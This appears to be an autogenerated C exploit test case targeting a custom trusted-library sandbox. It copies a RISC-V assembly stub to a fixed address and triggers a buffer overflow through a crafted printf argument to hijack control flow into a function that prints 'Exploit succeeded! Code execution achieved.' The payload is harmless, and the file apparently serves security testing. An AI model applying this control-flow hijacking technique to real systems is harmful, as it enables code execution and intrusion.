// AUTOGEN: pattern=similar_to_exploit_verify_return_value seed=5914139719710774729
#include "ministd.h"
#include "trusted_lib_api.h"
#include <stdint.h>

__attribute__((used)) void do_exploit()
{
    // Read handles table, and dump the files.
    TRUSTED_CALL_VOID(mini_printf, "Exploit succeeded! Code execution achieved.\n");
    ENTRY_POINT_END();
}

void proxy()
{
    __asm__ __volatile__(
        ".globl proxy_blob_begin\n"
        "proxy_blob_begin:\n"
        ".option push\n"
        ".option nopic\n" // ensure `la` expands to auipc+addi, not GOT
        ".option norvc\n"

        "la     t0, __abs_target\n" // GAS expands to auipc+addi with proper hi/lo pairing
        "ld     t0, 0(t0)\n"        // t0 = *(abs_target) = do_exploit
        "jalr   ra, t0, 0\n"        // call absolute target
        "ret\n"

        ".balign 8\n"
        "__abs_target:\n"
        ".dword  do_exploit\n" // embed absolute pointer inside the blob

        ".option pop\n"
        ".globl proxy_blob_end\n"
        "proxy_blob_end:\n");
}

ENTRY_POINT_ATTR void start()
{
    // Triggers BOF, and jumps to our pre-inited data.
    memcpy((void*)0x313130, (void*)&proxy, 0x40);
    TRUSTED_CALL_VOID(mini_printf, "%b\n", 0b110ull << 56ull);
    ENTRY_POINT_END();
}